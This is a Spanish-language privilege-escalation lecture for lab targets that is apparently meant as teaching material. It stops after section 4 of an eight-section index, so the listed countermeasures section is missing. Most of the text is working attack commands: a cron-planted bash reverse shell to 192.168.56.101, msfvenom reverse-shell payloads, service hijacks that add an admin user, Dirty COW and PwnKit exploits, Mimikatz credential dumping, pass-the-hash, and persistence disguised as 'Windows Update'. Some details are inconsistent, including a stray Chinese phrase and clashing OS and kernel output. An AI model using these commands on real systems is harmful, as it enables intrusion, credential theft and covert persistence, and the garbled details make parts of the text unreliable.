# CLASE 7: ESCALADA DE PRIVILEGIOS

---

## ÍNDICE

1. Fundamentos de Privilegios en Sistemas Operativos
2. Escalada de Privilegios en Linux
3. Escalada de Privilegios en Windows
4. Técnicas de Post-Explotación
5. Herramientas de Reconocimiento
6. Laboratorio Práctico: Metasploitable
7. Laboratorio Práctico: Máquina Windows
8. Contramedidas y Prevención

---

## 1. FUNDAMENTOS DE PRIVILEGIOS EN SISTEMAS OPERATIVOS

### 1.1. Modelo de Privilegios en Linux

Linux utiliza un modelo de permisos basado en Usuarios, Grupos y Otros:

```
┌─────────────────────────────────────────────────────────────────┐
│                    MODELO DE PERMISOS EN LINUX                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │                    USUARIOS                             │    │
│  │                                                         │    │
│  │   root (UID 0)                                          │    │
│  │   ├── Tiene acceso TOTAL al sistema                     │    │
│  │   ├── Puede leer/escribir/cualquier archivo            │    │
│  │   ├── Puede modificar configuraciones del sistema       │    │
│  │   └── Puede ejecutar cualquier programa                 │    │
│  │                                                         │    │
│  │   usuario (UID 1000)                                    │    │
│  │   ├── Permisos limitados                               │    │
│  │   ├── Solo puede modificar sus propios archivos        │    │
│  │   └── Restringido a nivel de kernel                     │    │
│  │                                                         │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  PERMISOS DE ARCHIVOS:                                          │
│  ┌───────┬───────┬───────┐                                    │
│  │  OWNER │ GROUP │ OTHER │                                    │
│  ├───────┼───────┼───────┤                                    │
│  │  rwx   │  r-x  │  ---  │                                    │
│  │  (7)   │  (5)  │  (0)  │                                    │
│  └───────┴───────┴───────┘                                    │
│                                                                 │
│  r = Lectura (4)    w = Escritura (2)    x = Ejecución (1)     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2. Modelo de Privilegios en Windows

Windows utiliza un modelo más granular con:

```
┌─────────────────────────────────────────────────────────────────┐
│                 MODELO DE PRIVILEGIOS EN WINDOWS                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  GRUPOS PRINCIPALES:                                            │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  Administrators                                         │    │
│  │  ├── Control total del sistema                          │    │
│  │  ├── Pueden instalar software                          │    │
│  │  ├── Pueden modificar registro                         │    │
│  │  └── Pueden crear/eliminar usuarios                     │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  Users (Usuario estándar)                               │    │
│  │  ├── Acceso a archivos propios                          │    │
│  │  ├── No pueden instalar software global                │    │
│  │  ├── No pueden modificar archivos del sistema          │    │
│  │  └── No pueden detener servicios críticos               │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  SYSTEM / LocalSystem                                  │    │
│  │  ├── Máximo privilegio (más que Administrator)         │    │
│  │  ├── Propietario de servicios del sistema              │    │
│  │  ├── Acceso sin restricciones a recursos                │    │
│  │  └── "NT AUTHORITY\SYSTEM"                             │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  TrustedInstaller                                       │    │
│  │  ├── Propietario de archivos de Windows                 │    │
│  │  ├── Instalador de Windows Update                       │    │
│  │  └── Puede ser usado para persistencia                  │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.3. Tokens de Acceso y Sesiones

```
┌─────────────────────────────────────────────────────────────────┐
│                    TOKEN DE ACCESO EN WINDOWS                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Cuando un usuario inicia sesión, Windows crea un:               │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  ACCESS TOKEN                                            │    │
│  │                                                         │    │
│  │  • SID del usuario (identificador único)                │    │
│  │  • SID de grupos                                         │    │
│  │  • Privilegios asignados                                 │    │
│  │  • Owner SID                                             │    │
│  │  • Primary Group SID                                     │    │
│  │  • Lista DACL (permisos)                                 │    │
│  │  • Token Source                                          │    │
│  │  • Level (Impersonation level)                          │    │
│  │  • Statistics                                            │    │
│  │  • Capabilities                                          │    │
│  │  • Restricciones                                         │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  TIPOS DE TOKENS:                                               │
│  • Primary Token: Creado en login, asociado a proceso            │
│  • Impersonation Token: Permite actuar como otro usuario        │
│                                                                 │
│  NIVELES DE IMPERSONATION:                                       │
│  • Anonymous: No se conoce la identidad                         │
│  • Identification: Puede identificar pero no impersonar        │
│  • Impersonation: Puede impersonar completamente                │
│  • Delegation: Puede impersonar en máquinas remotas            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.4. Sudo en Linux

```
┌─────────────────────────────────────────────────────────────────┐
│                    SUDO - SUPERUSER DO                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  /etc/sudoers - Archivo de configuración:                       │
│                                                                 │
│  ## Allow root to run any commands                               │
│  root    ALL=(ALL:ALL) ALL                                      │
│                                                                 │
│  ## Allow users in wheel group to run all commands              │
│  %wheel  ALL=(ALL:ALL) ALL                                      │
│                                                                 │
│  ## Allow user www-data to run specific commands without pass   │
│  www-data ALL=(root) NOPASSWD: /usr/bin/ systemctl status apache2│
│                                                                 │
│  FORMATO: usuario  host=(usuario_objetivo:grupo_objetivo) comandos│
│                                                                 │
│  META-CARACTERES:                                               │
│  • ALL: Todo (usuario, host, comando)                           │
│  • NOPASSWD: No requiere contraseña                             │
│  • PASSWD: Requiere contraseña                                  │
│  • Cmnd_Alias: Grupos de comandos                               │
│                                                                 │
│  ENTRADA INVÁLIDA EN SUDOERS = VULNERABILIDAD                   │
│                                                                 │
│  # SI HAY ERROR DE SINTAXIS, SUDO IGNORA LA LÍNEA COMPLETA     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. ESCALADA DE PRIVILEGIOS EN LINUX

### 2.1. Recopilación de Información Post-Explotación

Después de obtener acceso inicial (shell como usuario limitado), el primer paso es recopilar información:

```bash
# ============= IDENTIFICACIÓN BÁSICA =============

# Usuario actual y ID
id
# uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom)

whoami
# user

# Sistema operativo
cat /etc/os-release
# NAME="Ubuntu"
# VERSION="20.04.1 LTS (Focal Fossa)"

cat /etc/issue
# Ubuntu 20.04.1 LTS

# Kernel
uname -a
# Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

# Arquitectura
arch
# i686 (o x86_64)

# ============= CONFIGURACIÓN DE RED =============

# Interfaces de red
ip addr
# o
ifconfig -a

# Tabla de rutas
route -n
ip route

# Puertos listening
netstat -tulnp
ss -tulnp

# Conexiones establecidas
netstat -an
ss -ant

# ============= USUARIOS Y GRUPOS =============

# Lista de usuarios
cat /etc/passwd | grep -v nologin
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ...

# Lista de grupos
cat /etc/group

# Sudoers
cat /etc/sudoers
sudo -l  # SIEMPRE ejecutar esto primero

# ============= PROCESOS Y SERVICIOS =============

# Procesos ejecutándose
ps aux

# Lista de servicios
systemctl list-units --type=service --state=running
# o (systemas antiguos)
service --status-all

# Servicios que se inician con root
ps aux | grep root

# ============= ARCHIVOS IMPORTANTES =============

# Archivos SUID
find / -perm -4000 -type f 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null

# Archivos SGID
find / -perm -2000 -type f 2>/dev/null

# Archivos con capacidad de escritura
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null

# Archivos modificados recientemente
find / -mtime -1 -type f 2>/dev/null

# ============= INSTALACIONES Y PAQUETES =============

# Paquetes instalados
dpkg -l  # Debian/Ubuntu
rpm -qa   # RHEL/CentOS
yum list installed

# Programas disponibles
ls -la /usr/bin/
ls -la /usr/local/bin/

# ============= CRON JOBS =============

# Tareas programadas
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# ============= CONFIGURACIONES =============

# Archivos de configuración
ls -la /etc/*.conf

# Archivos de historial
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.sh_history

# Variables de entorno
env
printenv
```

### 2.2. Errores Comunes que Permiten Escalada

```
┌─────────────────────────────────────────────────────────────────┐
│             ERRORES COMUNES EN CONFIGURACIÓN DE SUDO             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. PERMISOS INCORRECTOS EN ARCHIVOS                            │
│     ┌─────────────────────────────────────────────────────┐     │
│     │ chmod 777 /etc/shadow                                │     │
│     │ chmod 777 /etc/passwd                                │     │
│     │ chmod 4777 /usr/bin/su                              │     │
│     └─────────────────────────────────────────────────────┘     │
│                                                                 │
│  2. BINARIOS CON PERMISIOS SUID                                 │
│     • find / -perm -4000 -type f 2>/dev/null                  │
│     • ¿Hay binarios editables?                                  │
│     • ¿Falta alguna librería?                                   │
│                                                                 │
│  3. COMANDOS PERMITIDOS EN SUDOERS                              │
│     ┌─────────────────────────────────────────────────────┐     │
│     │ user ALL=(ALL) NOPASSWD: /usr/bin/less /etc/shadow │     │
│     │ user ALL=(ALL) NOPASSWD: /bin/more /etc/shadow      │     │
│     │ user ALL=(ALL) NOPASSWD: /usr/bin/vim /etc/shadow   │     │
│     └─────────────────────────────────────────────────────┘     │
│     → less /etc/shadow → :!/bin/bash → ROOT!                   │
│                                                                 │
│  4. CONFIGURACIÓN NFS EXPORTADA                                 │
│     /etc/exports                                                 │
│     /home *(rw,no_root_squash)                                  │
│     → Montar desde Kali → acceso root remoto                    │
│                                                                 │
│  5. KERNEL VULNERABLE                                           │
│     • exploit-db.com → buscar exploits de kernel                │
│     • dirtycow (CVE-2016-5195)                                  │
│     • overlayfs (CVE-2015-1328)                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.3. Explotación de Binarios SUID

**Listar binarios SUID:**

```bash
# Buscar binarios SUID
find / -perm -4000 -type f 2>/dev/null

# Output típico en sistema vulnerable:
# /bin/su
# /usr/bin/passwd
# /usr/bin/newgrp
# /usr/bin/gpasswd
# /usr/bin/chsh
# /usr/bin/chfn
# /usr/bin/at
# /usr/bin/crontab
# /usr/bin/mtr
# /usr/bin/sudo
# /usr/bin/traceroute
# /sbin/unix_chkpwd
# /sbin/pam_extra_chkpwd
```

**Verificar propiedades de binarios:**

```bash
# Verificar binario específico
ls -la /usr/bin/vim
# -rwsr-xr-x 1 root root 196 ...

# Analizar el binario
strings /usr/bin/vim | head -20

# Ver dependencias
ldd /usr/bin/vim
```

### 2.4. GTFOBins: Binarios que Pueden Dar shell

GTFOBins (gtfobins.github.io) es una colección de binarios Unix que pueden ser explotados:

```
┌─────────────────────────────────────────────────────────────────┐
│                    GTFOBins - EXPLOTACIÓN                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  nano                                                           │
│  ────                                                           │
│  Si tiene permisos sudo o es SUID:                              │
│  sudo nano                                                      │
│  → Ctrl+R, Ctrl+X                                              │
│  → reset; sh 1>&0 2>&0                                         │
│                                                                 │
│  vim                                                            │
│  ───                                                           │
│  sudo vim                                                       │
│  → :!/bin/sh                                                   │
│  → :shell                                                      │
│                                                                 │
│  less                                                           │
│  ───                                                           │
│  sudo less /etc/passwd                                          │
│  → !/bin/sh                                                    │
│                                                                 │
│  more                                                           │
│  ───                                                           │
│  sudo more /etc/passwd                                          │
│  → !/bin/bash                                                  │
│                                                                 │
│  awk                                                            │
│  ───                                                           │
│  sudo awk 'BEGIN {system("/bin/bash")}'                         │
│                                                                 │
│  find                                                           │
│  ───                                                           │
│  sudo find . -exec /bin/bash -p \; -quit                        │
│                                                                 │
│  nmap                                                           │
│  ───                                                           │
│  echo "os.execute('/bin/bash')" > /tmp/shell.nse                │
│  sudo nmap --script=/tmp/shell.nse                              │
│                                                                 │
│  python                                                         │
│  ──────                                                         │
│  sudo python -c 'import os; os.system("/bin/bash")'             │
│                                                                 │
│  perl                                                           │
│  ─────                                                         │
│  sudo perl -e 'exec "/bin/bash";'                               │
│                                                                 │
│  ruby                                                           │
│  ─────                                                         │
│  sudo ruby -e 'exec "/bin/bash"'                                │
│                                                                 │
│  tcpdump                                                        │
│  ───────                                                       │
│  echo $'id\n' | sudo tcpdump -e -n -i eth0 -w /dev/null         │
│  → Crear script malicioso                                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.5. Explotación de Configuraciones de Red

**NFS sin root_squash:**

```bash
# En Kali, verificar exports desde la víctima
showmount -e 192.168.56.102

# Output vulnerable:
# /home *(rw,no_root_squash)

# Montar el directorio
mkdir -p /mnt/nfs
mount -t nfs 192.168.56.102:/home /mnt/nfs

# Crear archivo SUID en el mount
cd /mnt/nfs
echo '#include <stdio.h>' > shell.c
echo 'int main() { setuid(0); system("/bin/bash"); }' >> shell.c
gcc shell.c -o shell
chmod 4755 shell

# En la víctima, ejecutar el archivo
/home/user/shell
# ¡Ahora eres root!
```

### 2.6. Explotación de Cron Jobs

```bash
# Ver tareas programadas
cat /etc/crontab
ls -la /etc/cron.*

# Ejemplo de crontab vulnerable:
# */5 * * * * root /usr/local/bin/backup.sh

# Si backup.sh es escribible:
cat /usr/local/bin/backup.sh
# #!/bin/bash
# cd /var/www/html && tar czf /backups/backup.tar.gz *

# Modificar para obtener shell
echo '#!/bin/bash' > /usr/local/bin/backup.sh
echo 'bash -i >& /dev/tcp/192.168.56.101/4444 0>&1' >> /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh

# Esperar 5 minutos o reiniciar servicio cron
```

### 2.7. Explotación de MySQL/PostgreSQL

**MySQL:**

```bash
# Verificar servicio MySQL
ps aux | grep mysql

# Acceder a MySQL (si hay password en config o默认为空)
mysql -u root
mysql -u root -p

# Dentro de MySQL:
USE mysql;
SELECT * FROM user;

# Si puedes escribir:
CREATE TABLE test(line varchar(100));
LOAD DATA INFILE '/etc/passwd' INTO TABLE test;
SELECT * FROM test;

# Escalada: UDF (User Defined Functions)
# Crear biblioteca maliciosa
# require 'msf/core'
# O usar sqlmap --os-shell

# Si MySQL corre como root:
# SELECT sys_exec('usermod -a -G admin root');
# SELECT sys_eval('cat /etc/shadow > /tmp/shadow.txt');
```

**PostgreSQL:**

```bash
# Verificar servicio PostgreSQL
ps aux | grep postgres

# Acceder
psql -U postgres
# contraseña típica: postgres, password, empty

# Ver usuarios
SELECT usename FROM pg_user;
SELECT rolname FROM pg_roles;

# Si eres superuser:
# Crear función para ejecutar comandos
CREATE FUNCTION system_exec(text) RETURNS void AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT;
SELECT system_exec('id > /tmp/out.txt');

# Os shell:
\! /bin/bash
```

### 2.8. Explotación del Kernel de Linux

**Enumeración del kernel:**

```bash
# Versión del kernel
uname -r
# 2.6.24-16-server

# Búsqueda de exploits en exploit-db local
searchsploit linux 2.6.24
# o en línea: https://www.exploit-db.com/search?q=2.6.24

# Exploits comunes:
# • CVE-2009-2692 - sock_sendpage()
# • CVE-2009-2698 - udp_sendmsg()
# • CVE-2010-3858 - sockops()
# • CVE-2016-5195 - dirtycow
# • CVE-2017-1000112 - netfilter
# • CVE-2021-4034 - polkit's pkexec (PwnKit)
```

**Dirty COW (CVE-2016-5195):**

```bash
# En Kali, descargar exploit
searchsploit -m 40616
# o
wget https://www.exploit-db.com/raw/40616 -O dirtycow.c

# Compilar
gcc -pthread dirtycow.c -o dirtycow -lcrypt

# Ejecutar
./dirtycow
# Crea usuario firefart con UID 0

# Verificar
id firefart
# uid=0(firefart)
```

**PwnKit (CVE-2021-4034):**

```bash
# Verificar versión de polkit
dpkg -l | grep policykit

# Descargar exploit
wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.zip
unzip main.zip
cd CVE-2021-4034-main

# Compilar
make

# Ejecutar
./cve-2021-4034
# ¡Shell como root!
```

---

## 3. ESCALADA DE PRIVILEGIOS EN WINDOWS

### 3.1. Recopilación de Información en Windows

```powershell
# ============= IDENTIFICACIÓN BÁSICA =============

# Usuario actual
whoami
whoami /all
whoami /groups
whoami /priv

# Nombre del sistema
hostname

# Sistema operativo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Información de dominio
echo %USERDOMAIN%
echo %LOGONSERVER%

# ============= CONFIGURACIÓN DE RED =============

# Interfaces de red
ipconfig /all

# Conexiones de red
netstat -ano

# Tabla de rutas
route print

# Políticas de firewall
netsh advfirewall show allprofiles

# ============= USUARIOS Y GRUPOS =============

# Usuarios locales
net user

# Detalle de usuario específico
net user administrator
net user %USERNAME%

# Grupos locales
net localgroup

# Miembros de grupo
net localgroup administrators
net localgroup "Remote Desktop Users"

# ============= SERVICIOS =============

# Lista de servicios
sc query
sc query state= all

# Detalle de servicio específico
sc qc [service_name]

# Servicios con permisos débiles
wmic service list brief
wmic service where "pathname like '% %'" get name,pathname,state

# ============= PROCESOS =============

# Procesos ejecutándose
tasklist /v
tasklist /svc

# Con info de servicio
wmic process list brief
wmic process where "name='explorer.exe'" get processid,parentprocessid,commandline

# ============= REGISTRO =============

# Programas que inician
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Claves de servicios
reg query "HKLM\SYSTEM\CurrentControlSet\Services"

# Contraseñas guardadas
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# ============= ARCHIVOS IMPORTANTES =============

# Archivos en desktop
dir C:\Users\* /s /b | findstr /i desktop

# Contraseñas en archivos de configuración
findstr /si password *.xml *.ini *.txt *.cfg *.inf *.conf

# Configuración de servicios no estándar
dir /s /b *unattend* *sysprep* *autologon*

# Logs
dir C:\Windows\Panther\Unattend.xml
dir C:\Windows\Panther\Sysprep.inf
```

### 3.2. Análisis de Permisos de Servicios

**Manual con sc:**

```cmd
:: Ver ACL de un servicio
sc sdshow [service_name]

:: Formato SDDL (Security Descriptor Definition Language)
:: D: DACL
:: S: Owner
:: G: Primary Group
:: (A;;CCDCLCSWRPWPDTLOCRSDRC;;;SY)  → System
:: (A;;CCDCLCSWRPWPDTLOCRSDRC;;;BA)  → Administrators
:: (A;;CCDCLCSWRPWPDTLOCRSDRC;;;AU)  → Authenticated Users

:: Buscar servicios con permisos débiles
:: Si "Interactive" o "Users" tienen permisos de escritura
```

**Con accesschk (Sysinternals):**

```powershell
# Descargar desde Kali
# https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

# Ver servicios con permisos
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
accesschk.exe -qwuv "Service BITS"

# Buscar servicios que cualquier usuario puede modificar
accesschk.exe -uwcqv "*" * /accepteula
```

### 3.3. Explotación de Servicios con Permisos Débiles

**Si puedes modificar un servicio:**

```cmd
:: 1. Modificar la ruta del ejecutable
sc config [service_name] binpath= "C:\Windows\Temp\payload.exe"

:: 2. Cambiar tipo de inicio
sc config [service_name] start= auto

:: 3. Reiniciar servicio
net stop [service_name]
net start [service_name]

:: O usar PowerShell
powershell -c "Set-Service -Name 'ServiceName' -StartupType Automatic; Start-Service 'ServiceName'"
```

**Crear payload malicioso:**

```bash
# En Kali, generar payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o payload.exe

# Transferir a Windows
# via smb, wget, certutil, etc.
```

### 3.4. Insecure Service Permissions

```
┌─────────────────────────────────────────────────────────────────┐
│           INSECURE SERVICE PERMISSIONS - ESCALADA                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PROBLEMA: El servicio tiene permisos DACL débiles               │
│                                                                 │
│  ESCENARIO:                                                     │
│  Un usuario sin privilegios puede:                              │
│  • Cambiar el binario ejecutable del servicio                   │
│  • Modificar la configuración                                   │
│  • Reiniciar el servicio                                        │
│                                                                 │
│  IDENTIFICACIÓN:                                                │
│  C:\> sc sdshow service_name                                   │
│                                                                 │
│  BÚSQUEDA CON accesschk:                                        │
│  C:\> accesschk.exe -uwcqv "Users" * /accepteula               │
│  RW [service_name]                                             │
│  SERVICE_ALL_ACCESS                                            │
│                                                                 │
│  EXPLOTACIÓN:                                                   │
│  :: Opción 1: Cambiar binpath                                   │
│  C:\> sc config service_name binpath= "cmd /c net user attacker P@ssw0rd123! /add && net localgroup administrators attacker /add"  │
│  C:\> net start service_name                                   │
│                                                                 │
│  :: Opción 2: Reemplazar binario                                │
│  C:\> sc config service_name binpath= "C:\temp\payload.exe"   │
│  C:\> net start service_name                                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3.5. Unquoted Service Paths

**Concepto:**

```
┌─────────────────────────────────────────────────────────────────┐
│                 UNQUOTED SERVICE PATHS                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Servicio con binpath vulnerable:                               │
│  C:\Program Files\Custom App\custom app\myapp.exe               │
│                                                                 │
│  Windows intenta ejecutar en orden:                              │
│  1. C:\Program.exe                                             │
│  2. C:\Program Files\Custom.exe                                 │
│  3. C:\Program Files\Custom App\custom.exe                       │
│  4. C:\Program Files\Custom App\custom app\myapp.exe  ← CORRECTO │
│                                                                 │
│  Si existe "C:\Program.exe" o "C:\Program Files\Custom.exe",   │
│  se ejecuta con privilegios del servicio (SYSTEM!)             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Enumeración:**

```powershell
# Buscar servicios con rutas sin comillas
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\" | findstr /i /v '"'

# Con PowerUp.ps1
powershell -ExecutionPolicy Bypass -c ". .\PowerUp.ps1; Get-UnquotedServicePath"

# Con WinPEAS
winpeas.exe serviceinfo
```

**Explotación:**

```bash
# En Kali, crear payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o Custom.exe

# Transferir a Windows
# Subir a directorio vulnerable

# Esperar reinicio o reiniciar servicio
sc stop [service_name]
copy Custom.exe "C:\Program Files\Custom.exe"
sc start [service_name]
```

### 3.6. AlwaysInstallElevated

```
┌─────────────────────────────────────────────────────────────────┐
│               ALWAYSINSTALLELEVATED - MSI COMO SYSTEM            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  HABILITADO SI:                                                 │
│  HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
│  HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
│                                                                 │
│  EXPLOTACIÓN:                                                   │
│                                                                 │
│  1. GENERAR MSI MALICIOSO                                        │
│     msfvenom -p windows/meterpreter/reverse_tcp                 │
│            LHOST=192.168.56.101                                 │
│            LPORT=4444                                           │
│            -f msi > shell.msi                                  │
│                                                                 │
│  2. EJECUTAR COMO USUARIO                                       │
│     msiexec /quiet /qn /i shell.msi                            │
│                                                                 │
│  3. RESULTADO: INSTALACIÓN COMO SYSTEM                          │
│                                                                 │
│  MSI = Microsoft Windows Installer Package                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3.7. DLL Hijacking

```powershell
# Buscar aplicaciones que cargan DLLs de forma insegura
# 1. Buscar aplicaciones con DLLs faltantes
# 2. Buscar donde la aplicación busca DLLs
# 3. Colocar DLL maliciosa en directorio vulnerable

# Con WinPEAS
winpeas.exe

# Buscar en específico
for /r C:\ %x in (*.exe) do (dumpbin /dependents "%x" 2>nul | findstr /i "dll")
```

### 3.8. Explotación de Scheduled Tasks

```cmd
# Ver tareas programadas
schtasks /query /fo LIST /v

# Tareas con credenciales
# Si encontramos tarea que corre como SYSTEM y es editable

# Modificar tarea
schtasks /change /tn "TaskName" /tr "C:\temp\payload.exe"

# Ejecutar inmediatamente
schtasks /run /tn "TaskName"
```

### 3.9. Token Impersonation

**incognito (Meterpreter):**

```bash
# En meterpreter
use incognito
list_tokens -u

# Delegation tokens disponibles:
# WORKGROUP\Administrator
# NT AUTHORITY\SYSTEM

# Impersonar token
impersonate_token "NT AUTHORITY\SYSTEM"

# Verificar
getuid
# Server username: NT AUTHORITY\SYSTEM
```

**Rotten Potato / Juicy Potato:**

```
┌─────────────────────────────────────────────────────────────────┐
│              ROTTEN POTATO / JUICY POTATO                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  REQUISITOS:                                                    │
│  • Proceso corriendo como SYSTEM                                │
│  • Servicio que permite impersonation                          │
│  • Puerto 4444 disponible                                       │
│                                                                 │
│  FUNCIONAMIENTO:                                                │
│  1. MiTM de authentication del servicio (NTLM relay)          │
│  2. Crear token de SYSTEM                                       │
│  3. Impersonar token                                           │
│                                                                 │
│  DESCARGA:                                                      │
│  https://github.com/ohpe/juicy-potato/releases                  │
│                                                                 │
│  EJECUCIÓN:                                                     │
│  JuicyPotato.exe -l 4444 -c "{CLSID}" -p C:\Windows\Temp\cmd.exe│
│                                                                 │
│  CLSID de prueba:                                               │
│  {8BC3F884-8DE6-4E53-A46D-6B7C7A1D11A2} (Server 2003)         │
│  {9B1F122C-2982-4E91-81BB-40EF4738EA8F} (Server 2008 R2)      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4. TÉCNICAS DE POST-EXPLOTACIÓN

### 4.1. Búsqueda de Contraseñas

**En Linux:**

```bash
# Archivos de configuración
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*config*" -exec grep -l "password" {} \; 2>/dev/null

# Archivos de historial
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.pgsql_history
cat ~/.sh_history

# Archivos de texto plano
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /etc/ 2>/dev/null

# Contraseñas en memoria
cat /proc/*/cmdline 2>/dev/null | strings | grep -i password

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa

# Contraseñas guardadas por servicios
cat /etc/mysql/my.cnf
cat /etc/postgresql/pg_hba.conf
```

**En Windows:**

```powershell
# Contraseñas en registro
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4"
reg query "HKCU\Software\PuTTY\Sessions"

# SAM database (si tienes permisos)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak

# Descifrar SAM con boot key
# Usar pwdump, samdump2, impacket-secretsdump

# Archivos con contraseñas
findstr /si "password" *.txt *.xml *.ini *.conf *.cfg *.inf *.vbs *.bat *.ps1

# WCE (Windows Credential Editor)
# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### 4.2. Mimikatz - Extracción de Credenciales

```
┌─────────────────────────────────────────────────────────────────┐
│                    MIMIKATZ - EXTRACCIÓN DE CREDENCIALES         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  DESCARGA:                                                      │
│  https://github.com/gentilkiwi/mimikatz/releases                │
│                                                                 │
│  COMANDOS ESENCIALES:                                           │
│                                                                 │
│  :: Habilitar debug                                             │
│  privilege::debug                                               │
│                                                                 │
│  :: Extraer contraseñas en texto claro                          │
│  sekurlsa::logonpasswords                                       │
│                                                                 │
│  :: Extraer hashes NTLM                                         │
│  sekurlsa::msv                                                  │
│                                                                 │
│  :: Dump de SAM                                                 │
│  lsadump::sam /sam:sam.bak /system:system.bak                   │
│                                                                 │
│  :: Extraer tickets Kerberos                                    │
│  sekurlsa::tickets                                              │
│                                                                 │
│  :: Pass-the-Hash                                               │
│  sekurlsa::pth /user:administrator /ntlm:<hash>                │
│                                                                 │
│  :: Extraer de proceso LSASS                                    │
│  sekurlsa::minidump lsass.dmp                                   │
│  sekurlsa::logonpasswords                                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 4.3. Pass-the-Hash

**Con hash NTML de administrador:**

```bash
# Con evil-winrm
evil-winrm -i 192.168.56.105 -u administrator -H <NTLM_HASH>

# Con impacket-psexec
impacket-psexec -hashes :<NTLM_HASH> domain/username@192.168.56.105

# Con crackmapexec
crackmapexec smb 192.168.56.105 -u administrator -H <NTLM_HASH> -x "whoami"

# Con smbexec
impacket-smbexec -hashes :<NTLM_HASH> domain/username@192.168.56.105
```

**Pass-the-Ticket (Kerberos):**

```bash
# Extraer ticket con mimikatz
mimikatz # sekurlsa::tickets /export

# Usar ticket
mimikatz # kerberos::ptt [ticket.kirbi]

# Verificar
klist
```

### 4.4. Creación de Persistencia

**Linux - Claves SSH:**

```bash
# Agregar clave pública a authorized_keys
mkdir ~/.ssh
echo "ssh-rsa AAAAB3NzaC1..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Clave inversa
ssh-keygen -t rsa
# Copiar clave pública a víctima
```

**Linux - Cron job:**

```bash
# Agregar tarea cron
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/reverse.sh") | crontab -
```

**Windows - Registro:**

```cmd
:: Agregar a Run
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

:: Agregar a RunOnce
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "SystemUpdate" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

**Windows - Scheduled Task:**

```cmd
schtasks /create /tn "Windows Update" /tr "C:\Windows\Temp\payload.exe" /sc hourly /ru SYSTEM
```

---

